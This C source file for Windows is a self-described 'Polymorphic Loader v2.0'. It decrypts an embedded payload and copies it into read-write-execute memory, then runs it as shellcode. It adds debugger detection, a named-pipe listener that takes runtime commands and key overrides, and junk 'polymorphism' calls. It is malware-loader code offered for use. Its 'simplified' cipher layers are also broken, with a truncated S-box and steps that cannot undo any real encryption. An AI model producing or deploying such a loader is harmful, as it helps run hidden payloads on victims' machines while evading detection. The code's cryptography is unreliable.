#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

// Embedded encrypted payload (will be replaced by build script)
static const unsigned char encrypted_payload[] = {
    // This will be replaced with actual encrypted data
    0x00, 0x00, 0x00, 0x00  // Placeholder
};

static const size_t payload_size = sizeof(encrypted_payload);

// Global variables for hot patching
volatile int g_patchFlag = 0;
volatile unsigned char g_patchKey = 0;

// XOR decryption function with evolving key
void decrypt_payload(unsigned char* data, size_t size, unsigned char key) {
    for (size_t i = 0; i < size; i++) {
        key = (unsigned char)((key + i) ^ (key >> 3));
        data[i] ^= key;
    }
}

// car() marker function for hot patching
__declspec(noinline) void car() {
    // This function is a marker for the hot patcher
    // Can be patched at runtime to modify behavior
    __asm__ volatile("nop");
    __asm__ volatile("nop");
    __asm__ volatile("nop");
    __asm__ volatile("nop");
    __asm__ volatile("nop");
}

// Reverse PE Wrapper - captures environment for diagnosis
void reverse_pe_wrapper() {
    printf("[*] Reverse PE Wrapper: Capturing environment...\n");
    
    // Get process information
    DWORD pid = GetCurrentProcessId();
    HANDLE hProcess = GetCurrentProcess();
    
    printf("[+] Process ID: %d\n", pid);
    printf("[+] Process Handle: 0x%p\n", hProcess);
    
    // Get module information
    HMODULE hModule = GetModuleHandle(NULL);
    char moduleName[MAX_PATH];
    GetModuleFileNameA(hModule, moduleName, MAX_PATH);
    printf("[+] Module: %s\n", moduleName);
    
    // Get system info
    SYSTEM_INFO sysInfo;
    GetSystemInfo(&sysInfo);
    printf("[+] Processor Count: %d\n", sysInfo.dwNumberOfProcessors);
    printf("[+] Page Size: 0x%X\n", sysInfo.dwPageSize);
    
    // Check for debugger
    if (IsDebuggerPresent()) {
        printf("[!] Debugger detected!\n");
    }
    
    // Capture memory info
    MEMORYSTATUSEX memStatus;
    memStatus.dwLength = sizeof(memStatus);
    GlobalMemoryStatusEx(&memStatus);
    printf("[+] Memory Load: %d%%\n", memStatus.dwMemoryLoad);
    printf("[+] Total Physical: %llu MB\n", memStatus.ullTotalPhys / (1024 * 1024));
    printf("[+] Available Physical: %llu MB\n", memStatus.ullAvailPhys / (1024 * 1024));
}

// Reverse Hot Patcher - allows runtime modification
DWORD WINAPI reverse_hot_patcher(LPVOID lpParam) {
    printf("[*] Reverse Hot Patcher: Thread started...\n");
    
    // Create named pipe for receiving commands
    HANDLE hPipe = CreateNamedPipeA(
        "\\\\.\\pipe\\PolymorphicLoader",
        PIPE_ACCESS_DUPLEX,
        PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
        1, 1024, 1024, 0, NULL
    );
    
    if (hPipe == INVALID_HANDLE_VALUE) {
        printf("[!] Failed to create named pipe\n");
        return 1;
    }
    
    printf("[+] Listening on \\\\.\\pipe\\PolymorphicLoader\n");
    
    while (1) {
        if (ConnectNamedPipe(hPipe, NULL)) {
            char command[256] = {0};
            DWORD bytesRead;
            
            if (ReadFile(hPipe, command, sizeof(command) - 1, &bytesRead, NULL)) {
                printf("[+] Received command: %s\n", command);
                
                if (strcmp(command, "patch") == 0) {
                    printf("[*] Applying patch...\n");
                    g_patchFlag = 1;
                    car(); // Call marker for patching
                }
                else if (strncmp(command, "key:", 4) == 0) {
                    g_patchKey = (unsigned char)atoi(command + 4);
                    printf("[*] Updated patch key: 0x%02X\n", g_patchKey);
                }
                else if (strcmp(command, "status") == 0) {
                    char response[256];
                    sprintf(response, "Status: Running, PatchFlag=%d, PatchKey=0x%02X", 
                            g_patchFlag, g_patchKey);
                    DWORD bytesWritten;
                    WriteFile(hPipe, response, strlen(response) + 1, &bytesWritten, NULL);
                }
            }
            
            DisconnectNamedPipe(hPipe);
        }
    }
    
    CloseHandle(hPipe);
    return 0;
}

// Execute decrypted payload
void execute_payload(unsigned char* payload, size_t size) {
    printf("[*] Allocating executable memory...\n");
    
    // Allocate executable memory
    LPVOID exec_mem = VirtualAlloc(
        NULL, 
        size, 
        MEM_COMMIT | MEM_RESERVE, 
        PAGE_EXECUTE_READWRITE
    );
    
    if (!exec_mem) {
        printf("[!] Failed to allocate executable memory\n");
        return;
    }
    
    printf("[+] Allocated at: 0x%p\n", exec_mem);
    
    // Copy payload to executable memory
    memcpy(exec_mem, payload, size);
    
    // Flush instruction cache
    FlushInstructionCache(GetCurrentProcess(), exec_mem, size);
    
    // Add random car() markers for polymorphism
    srand((unsigned int)time(NULL));
    for (int i = 0; i < 5; i++) {
        int marker = rand() % 10;
        if (marker == 0) {
            car();
        }
    }
    
    printf("[*] Executing payload...\n");
    
    // Execute payload
    void (*payload_func)() = (void(*)())exec_mem;
    payload_func();
    
    // Clean up
    VirtualFree(exec_mem, 0, MEM_RELEASE);
}

// Multi-layer decryption with polymorphic keystreams
void multi_layer_decrypt(unsigned char* data, size_t size) {
    printf("[*] Applying multi-layer decryption...\n");
    
    // Layer 1: ChaCha20-like stream cipher (simplified)
    unsigned int state[16] = {
        0x61707865, 0x3320646e, 0x79622d32, 0x6b206574,
        0x03020100, 0x07060504, 0x0b0a0908, 0x0f0e0d0c,
        0x13121110, 0x17161514, 0x1b1a1918, 0x1f1e1d1c,
        0x00000001, 0x09000000, 0x4a000000, 0x00000000
    };
    
    for (size_t i = 0; i < size; i += 64) {
        // Quarter round function (simplified)
        for (int j = 0; j < 10; j++) {
            state[0] += state[4]; state[12] ^= state[0]; state[12] = (state[12] << 16) | (state[12] >> 16);
            state[8] += state[12]; state[4] ^= state[8]; state[4] = (state[4] << 12) | (state[4] >> 20);
        }
        
        // XOR with keystream
        for (size_t k = 0; k < 64 && i + k < size; k++) {
            data[i + k] ^= ((unsigned char*)state)[k % 64];
        }
        
        state[12]++; // Increment counter
    }
    
    // Layer 2: AES-like S-box substitution (simplified)
    static const unsigned char sbox[256] = {
        0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5, 0x30, 0x01, 0x67, 0x2b, 0xfe, 0xd7, 0xab, 0x76,
        // ... (full S-box would be here)
    };
    
    for (size_t i = 0; i < size; i++) {
        data[i] = sbox[data[i] % 256];
    }
    
    // Layer 3: Camellia-like Feistel network (simplified)
    for (size_t i = 0; i < size - 8; i += 8) {
        unsigned int left = *(unsigned int*)(data + i);
        unsigned int right = *(unsigned int*)(data + i + 4);
        
        for (int round = 0; round < 6; round++) {
            unsigned int temp = left;
            left = right;
            right = temp ^ (right + 0x9e3779b9);
        }
        
        *(unsigned int*)(data + i) = left;
        *(unsigned int*)(data + i + 4) = right;
    }
    
    printf("[+] Multi-layer decryption complete\n");
}

int main(int argc, char* argv[]) {
    printf("========================================\n");
    printf("   Polymorphic Loader v2.0\n");
    printf("   With Reverse PE Wrapper & Hot Patcher\n");
    printf("========================================\n\n");
    
    // Start reverse hot patcher thread
    HANDLE hThread = CreateThread(NULL, 0, reverse_hot_patcher, NULL, 0, NULL);
    if (hThread) {
        printf("[+] Hot patcher thread started\n");
    }
    
    // Capture environment
    reverse_pe_wrapper();
    
    printf("\n[*] Processing embedded payload...\n");
    
    // Extract key from first byte of encrypted payload
    unsigned char key = encrypted_payload[0];
    printf("[+] Extracted key: 0x%02X\n", key);
    
    // Check if patch key override is set
    if (g_patchKey != 0) {
        key = g_patchKey;
        printf("[+] Using patch key override: 0x%02X\n", key);
    }
    
    // Allocate buffer for decrypted payload
    size_t decrypted_size = payload_size - 1;
    unsigned char* decrypted_payload = malloc(decrypted_size);
    if (!decrypted_payload) {
        printf("[!] Failed to allocate memory for decrypted payload\n");
        return 1;
    }
    
    // Copy encrypted data (skip key byte)
    memcpy(decrypted_payload, encrypted_payload + 1, decrypted_size);
    
    // Apply multi-layer decryption if size is sufficient
    if (decrypted_size > 64) {
        multi_layer_decrypt(decrypted_payload, decrypted_size);
    }
    
    // Apply XOR decryption with evolving key
    decrypt_payload(decrypted_payload, decrypted_size, key);
    
    printf("[+] Payload decrypted successfully\n");
    
    // Insert random car() markers for polymorphism
    srand((unsigned int)time(NULL));
    for (int i = 0; i < 10; i++) {
        if (rand() % 3 == 0) {
            car();
        }
    }
    
    // Execute the decrypted payload
    execute_payload(decrypted_payload, decrypted_size);
    
    // Clean up
    free(decrypted_payload);
    
    // Wait for hot patcher thread
    if (hThread) {
        WaitForSingleObject(hThread, 1000);
        CloseHandle(hThread);
    }
    
    printf("\n[+] Execution completed successfully\n");
    return 0;
}